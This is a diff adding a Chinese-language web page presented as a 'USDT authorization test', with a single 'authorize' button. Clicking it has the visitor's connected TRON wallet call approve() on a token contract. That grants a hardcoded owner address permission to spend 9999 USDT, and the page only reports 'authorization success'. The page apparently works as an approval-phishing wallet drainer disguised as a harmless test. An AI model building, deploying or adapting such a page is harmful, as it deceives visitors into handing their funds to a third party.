@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT授权测试</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f5f5f5;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 16px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>授权测试</h2>
+    <p>点击下方按钮进行USDT授权测试（9999 USDT）</p>
+    <button onclick="approveUSDT()">授权</button>
+  </div>
+
+  <script>
+    const USDT_CONTRACT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+    const OWNER_ADDRESS = 'TDjkeYy1mxfv65KW23fR9DnPfUz23E6Wc3';
+
+    async function approveUSDT() {
+      try {
+        const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        const amount = window.tronWeb.toSun(9999);
+        const result = await usdtContract.approve(OWNER_ADDRESS, amount).send();
+        alert('授权成功，交易ID：' + result);
+      } catch (error) {
+        console.error(error);
+        alert('授权失败，请检查钱包连接');
+      }
+    }
+  </script>
+</body>
+</html>
